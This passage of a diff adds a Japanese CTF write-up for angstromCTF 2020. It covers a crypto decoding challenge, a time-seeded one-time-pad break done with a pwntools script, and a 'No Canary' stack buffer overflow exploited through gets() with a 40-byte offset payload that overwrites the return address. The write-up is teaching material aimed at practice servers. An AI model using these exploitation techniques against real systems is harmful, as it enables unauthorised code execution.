+		<span style="color:#66d9ef">yield</span> int((ret<span style="color:#f92672">/</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>)
+		e<span style="color:#f92672">+</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+<span style="color:#66d9ef">try</span>:
+	a <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a: </span><span style="color:#e6db74">&#34;</span>))
+	b <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b: </span><span style="color:#e6db74">&#34;</span>))
+	c <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">c: </span><span style="color:#e6db74">&#34;</span>))
+	<span style="color:#75715e"># remove those pesky imaginary numbers, rationals, zeroes, integers, big numbers, etc</span>
+	<span style="color:#66d9ef">if</span> b<span style="color:#f92672">*</span>b <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c <span style="color:#f92672">or</span> a<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> b<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> c<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> Decimal(b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c)<span style="color:#f92672">.</span>sqrt()<span style="color:#f92672">.</span>to_integral_value()<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span>b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c <span style="color:#f92672">or</span> abs(a)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span> <span style="color:#f92672">or</span> abs(b)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span> <span style="color:#f92672">or</span> abs(c)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span>:
+		<span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>()
+	key <span style="color:#f92672">=</span> (Decimal(b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c)<span style="color:#f92672">.</span>sqrt() <span style="color:#f92672">-</span> Decimal(b))<span style="color:#f92672">/</span>Decimal(a<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+<span style="color:#66d9ef">except</span>:
+	<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">bad key</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">else</span>:
+	flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">&#34;</span>]<span style="color:#f92672">.</span>encode())
+	flag <span style="color:#f92672">=</span> bin(int(flag,<span style="color:#ae81ff">16</span>))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(len(flag)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
+	ret <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+	k <span style="color:#f92672">=</span> keystream(key)
+	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag:
+		ret <span style="color:#f92672">+</span><span style="color:#f92672">=</span> str(next(k)<span style="color:#f92672">^</span>int(i))
+	<span style="color:#66d9ef">print</span>(ret)
+</code></pre></div><p>少々複雑だったので、手元に環境を構築し動作を確認したところ、
+<code>a=1, b=4, c=1</code>の時にフラグが暗号化されないことが分かりました。</p>
+<p>(<code>flag = bin(int(flag,16))[2:].zfill(len(flag)*4)</code>と<code>ret</code>が同じ値になる)</p>
+<p>なので、鍵などを使わない単純なエンコードを元に戻せば良さそうです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">&#34;</span>]<span style="color:#f92672">.</span>encode())
+flag <span style="color:#f92672">=</span> bin(int(flag,<span style="color:#ae81ff">16</span>))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(len(flag)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
+</code></pre></div><p>元に戻すプログラムは以下の通りです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random<span style="color:#f92672">,</span>os<span style="color:#f92672">,</span>sys<span style="color:#f92672">,</span>binascii
+<span style="color:#f92672">from</span> decimal <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+enc_flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">01100001011000110111010001100110011110110110010001101111011101110110111001011111011101000110111101011111011101000110100001100101010111110110010001100101011000110110100101101101011000010110110001111101</span><span style="color:#e6db74">&#39;</span>
+
+dec_flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(hex(int(enc_flag,<span style="color:#ae81ff">2</span>))[<span style="color:#ae81ff">2</span>:])
+<span style="color:#66d9ef">print</span>(dec_flag)
+</code></pre></div><p>実行するとフラグが得られました！！</p>
+<p><code>actf{down_to_the_decimal}</code></p>
+<h2 id="one-time-bad-crypto-100-pts-248-solves">one time bad (Crypto, 100 pts, 248 solves)</h2>
+<pre><code>My super secure service is available now!
+
+Heck, even with the source, I bet you won't figure it out.
+
+nc misc.2020.chall.actf.co 20301
+</code></pre><p><code>nc</code>コマンドが書かれているので、とりあえず実行してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\kuzushiki\Desktop&gt; nc misc.2020.chall.actf.co 20301                       
+Welcome to my one time pad service!
+It<span style="color:#e6db74">&#39;s so unbreakable that *if* you do manage to decrypt my text, I&#39;</span>ll give you a flag!
+You will be given the ciphertext and key <span style="color:#66d9ef">for</span> samples, and the ciphertext <span style="color:#66d9ef">for</span> when you <span style="color:#66d9ef">try</span> to decrypt. All will be given <span style="color:#66d9ef">in</span> base 64, but when you enter your answer, give it <span style="color:#66d9ef">in</span> ASCII.
+Enter<span style="color:#960050;background-color:#1e0010">:</span>
+        1) Request sample
+        2) <span style="color:#66d9ef">Try</span> your luck at decrypting something!
+&gt; 1
+HCgkLRIQJR8SFgIDKhI= with key a3JoVGtXa0tQckduR3g=
+&gt; 2
+BQ==
+Your answer<span style="color:#960050;background-color:#1e0010">:</span> 1
+Wrong! The correct answer was w with key r
+</code></pre></div><p>ワンタイムパッド暗号のようです。</p>
+<p>暗号文から平文が求められればフラグを得られますが、ワンタイムパッドで使われる乱数は毎回変わります。</p>
+<p>ソースが配られているので見てみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> time
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> os
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">otp</span>(a, b):
+	r <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+	<span style="color:#66d9ef">for</span> i, j <span style="color:#f92672">in</span> zip(a, b):
+		r <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(ord(i) <span style="color:#f92672">^</span> ord(j))
+	<span style="color:#66d9ef">return</span> r
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genSample</span>():
+	p <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([string<span style="color:#f92672">.</span>ascii_letters[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(string<span style="color:#f92672">.</span>ascii_letters)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">30</span>))])
+	k <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([string<span style="color:#f92672">.</span>ascii_letters[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(string<span style="color:#f92672">.</span>ascii_letters)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(len(p))])
+
+	x <span style="color:#f92672">=</span> otp(p, k)
+
+	<span style="color:#66d9ef">return</span> x, p, k
+
+random<span style="color:#f92672">.</span>seed(int(time<span style="color:#f92672">.</span>time()))
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Welcome to my one time pad service!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">It</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s so unbreakable that *if* you do manage to decrypt my text, I</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ll give you a flag!</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">You will be given the ciphertext and key for samples, and the ciphertext for when you try to decrypt. All will be given in base 64, but when you enter your answer, give it in ASCII.</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Enter:</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">1) Request sample</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">2) Try your luck at decrypting something!</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">while</span> True:
+	choice <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#34;</span>))
+	<span style="color:#66d9ef">if</span> choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+		x, p, k <span style="color:#f92672">=</span> genSample()
+		<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64encode(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">with key</span><span style="color:#e6db74">&#34;</span>, base64<span style="color:#f92672">.</span>b64encode(k<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode())
+
+	<span style="color:#66d9ef">elif</span> choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+		x, p, k <span style="color:#f92672">=</span> genSample()
+		<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64encode(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode())
+		a <span style="color:#f92672">=</span> input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your answer: </span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>strip()
+		<span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> p:
+			<span style="color:#66d9ef">print</span>(os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FLAG</span><span style="color:#e6db74">&#34;</span>))
+			<span style="color:#66d9ef">break</span>
+
+		<span style="color:#66d9ef">else</span>:
+			<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Wrong! The correct answer was</span><span style="color:#e6db74">&#34;</span>, p, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">with key</span><span style="color:#e6db74">&#34;</span>, k)
+
+</code></pre></div><p>以下の部分より、乱数シードは時間によって決まることが分かります。</p>
+<p><code>random.seed(int(time.time()))</code></p>
+<p>ということは、ほぼ同時刻にサーバに接続すると同じ乱数が使われるのではないでしょうか？</p>
+<p>間違った答えを送ると正解が返ってくることを利用して、以下の手順で問題を解きます。</p>
+<ol>
+<li>サーバに接続（通信１）</li>
+<li>すぐにもう一度サーバに接続（通信２）</li>
+<li>通信１にて間違った答えを送り、正解を受け取る</li>
+<li>得られた答えを通信２でそのまま送る。</li>
+</ol>
+<p>以上を行うプログラムを作成し、実行しました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># 複数接続</span>
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20301</span>)
+io2 <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20301</span>)
+
+io<span style="color:#f92672">.</span>recv()
+io2<span style="color:#f92672">.</span>recv()
+
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+io2<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recv())
+<span style="color:#66d9ef">print</span>(io2<span style="color:#f92672">.</span>recv())
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">nandemoi-yo</span><span style="color:#e6db74">&#39;</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">answer was </span><span style="color:#e6db74">&#39;</span>)
+ans <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">0</span>]
+<span style="color:#66d9ef">print</span>(ans)
+io2<span style="color:#f92672">.</span>sendline(ans)
+<span style="color:#66d9ef">print</span>(io2<span style="color:#f92672">.</span>recv())
+</code></pre></div><p>実行すると、フラグが得られました！！！！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# python3 otb.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to misc.2020.chall.actf.co on port 20301: Done
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to misc.2020.chall.actf.co on port 20301: Done
+b<span style="color:#e6db74">&#39;GzsOEjoYECQuHAAyADwI\nYour answer: &#39;</span>
+b<span style="color:#e6db74">&#39;GzsOEjoYECQuHAAyADwI\nYour answer: &#39;</span>
+b<span style="color:#e6db74">&#39;YuChxwHRKLEAwsF&#39;</span>
+b<span style="color:#e6db74">&#39;actf{one_time_pad_more_like_i_dont_like_crypto-1982309}\n&#39;</span>
+</code></pre></div><h1 id="binary">BINARY</h1>
+<h2 id="no-canary-binary-50-pts-531-solves">No Canary (Binary, 50 pts, 531 solves)</h2>
+<pre><code>Agriculture is the most healthful, most useful and most noble employment of man.
+
+—George Washington
+
+Can you call the flag function in this program (source)? 
+Try it out on the shell server at /problems/2020/no_canary or by connecting with nc shell.actf.co 20700.
+</code></pre><p>とりあえずソースを見てみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
+	system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/cat flag.txt</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+	setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+	setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+	gid_t gid <span style="color:#f92672">=</span> getegid();
+	setresgid(gid, gid, gid);
+
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Ahhhh, what a beautiful morning on the farm!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">       _.-^-._    .--.</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">    .-&#39;   _   &#39;-. |__|</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">   /     |_|     </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  /               </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> /|     _____     |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  |    |==|==|    |  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  |    |--|--|    |  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  |    |==|==|    |  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">^^^^^^^^^^^^^^^^^^^^^^^^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Wait, what? It&#39;s already noon!</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Why didn&#39;t my canary wake me up?</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Well, sorry if I kept you waiting.</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">What&#39;s your name? </span><span style="color:#e6db74">&#34;</span>);
+
+	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">20</span>];
+	gets(name);
+
+	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Nice to meet you, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+}
+</code></pre></div><p><code>flag()</code>関数を実行できれば良さそうですが、<code>main()</code>関数から<code>flag()</code>関数に行くような処理はありません。</p>
+<p><code>gets()</code>関数が使われているのが気になります。</p>
+<p><code>gets()</code>関数はバッファオーバーランの危険性があるため、現在では廃止されています。</p>
+<p>これを利用して、<code>main()</code>関数の戻りアドレスを<code>flag()</code>関数に書き換えることはできないでしょうか？</p>
+<p><code>char name[20];</code>とあるので、とりあえず20文字以上入力してみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\kuzushiki\Desktop&gt; nc shell.actf.co 20700                                
+Ahhhh, what a beautiful morning on the farm!
+
+       _.-^-._    .--.
+    .-<span style="color:#e6db74">&#39;   _   &#39;</span>-. |__|
+   /     |_|     \|  |
+  /               \  |
+ /|     _____     |\ |
+  |    |==|==|    |  |
+  |    |--|--|    |  |
+  |    |==|==|    |  |
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+Wait, what? It<span style="color:#e6db74">&#39;s already noon!
+</span><span style="color:#e6db74">Why didn&#39;</span>t my canary wake me up?
+Well, sorry <span style="color:#66d9ef">if</span> I kept you waiting.
+What<span style="color:#960050;background-color:#1e0010">&#39;</span>s your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Segmentation fault
+</code></pre></div><p><code>Segmentation fault</code>となったので、バッファオーバーランが発生したことが分かります。</p>
+<p>それでは戻りアドレスを書き換えてみましょう</p>
+<p>まず、書き換え先である<code>flag()</code>関数のアドレスを調べます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/binary# objdump -d no_canary | grep flag
+<span style="color:#ae81ff">0000000000401186</span> &lt;flag&gt;:
+</code></pre></div><p>次に、何バイト書き込めば戻りアドレスが書き換わるのかを調べます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/binary# gdb -q ./no_canary
+Reading symbols from ./no_canary...
+<span style="color:#f92672">(</span>No debugging symbols found in ./no_canary<span style="color:#f92672">)</span>
+gdb-peda$ pattc <span style="color:#ae81ff">50</span>
+<span style="color:#e6db74">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#39;</span>
+gdb-peda$ run
+Starting program: /media/sf_share/CTF/angstrom/binary/no_canary 
+Ahhhh, what a beautiful morning on the farm!
+
+       _.-^-._    .--.
+    .-<span style="color:#e6db74">&#39;   _   &#39;</span>-. |__|
+   /     |_|     <span style="color:#ae81ff">\|</span>  |
+  /               <span style="color:#ae81ff">\ </span> |
+ /|     _____     |<span style="color:#ae81ff">\ </span>|
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
+  |    |--|--|    |  |
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+Wait, what? It<span style="color:#e6db74">&#39;s already noon!
+</span><span style="color:#e6db74">Why didn&#39;</span>t my canary wake me up?
+Well, sorry <span style="color:#66d9ef">if</span> I kept you waiting.
+What<span style="color:#e6db74">&#39;s your name? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+</span><span style="color:#e6db74">Nice to meet you, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA!
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Program received signal SIGSEGV, Segmentation fault.
+</span><span style="color:#e6db74">[----------------------------------registers-----------------------------------]
+</span><span style="color:#e6db74">RAX: 0x0 
+</span><span style="color:#e6db74">RBX: 0x0 
+</span><span style="color:#e6db74">RCX: 0x0 
+</span><span style="color:#e6db74">RDX: 0x7ffff7fac580 --&gt; 0x0 
+</span><span style="color:#e6db74">RSI: 0x7fffffffb970 (&#34;Nice to meet you, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA!\n&#34;)
+</span><span style="color:#e6db74">RDI: 0x0 
+</span><span style="color:#e6db74">RBP: 0x6141414541412941 (&#39;</span>A<span style="color:#f92672">)</span>AAEAAa<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
+RSP: 0x7fffffffe028 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;AA0AAFAAbA&#34;</span><span style="color:#f92672">)</span>
+RIP: 0x4012dd <span style="color:#f92672">(</span>&lt;main+324&gt;:	ret<span style="color:#f92672">)</span>
+R8 : 0x7ffff7fb1500 <span style="color:#f92672">(</span>0x00007ffff7fb1500<span style="color:#f92672">)</span>
+:
+:
+省略
+:
+:
+gdb-peda$ patto AA0AAFAAbA
+AA0AAFAAbA found at offset: <span style="color:#ae81ff">40</span>
+</code></pre></div><p><code>pattc</code>コマンドで文字パターンを生成、<code>patto</code>コマンドで文字列が文字パターンの何番目に現れるかを計算します。</p>
+<p>書き換わった<code>RSP</code>の値<code>('A)AAEAAa'</code>は40番目に出てくるそうです。</p>
+<p>つまり<code>何か40文字 + flag()関数のアドレス</code>を入力すれば<code>flag()</code>関数に遷移できそうです。</p>
+<p>早速試してみましょう！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+flag_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401186</span>
+
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">shell.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20700</span>)
+
+io<span style="color:#f92672">.</span>recv()
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> p64(flag_addr)
+io<span style="color:#f92672">.</span>sendline(payload)
+
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>実行するとフラグが得られました！！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom/binary# python3 no.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to shell.actf.co on port 20700: Done
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+
+       _.-^-._    .--.
+    .-<span style="color:#e6db74">&#39;   _   &#39;</span>-. |__|
+   /     |_|     <span style="color:#ae81ff">\|</span>  |
+  /               <span style="color:#ae81ff">\ </span> |
+ /|     _____     |<span style="color:#ae81ff">\ </span>|
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
+  |    |--|--|    |  |
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+Wait, what? It<span style="color:#e6db74">&#39;s already noon!
+</span><span style="color:#e6db74">Why didn&#39;</span>t my canary wake me up?
+Well, sorry <span style="color:#66d9ef">if</span> I kept you waiting.
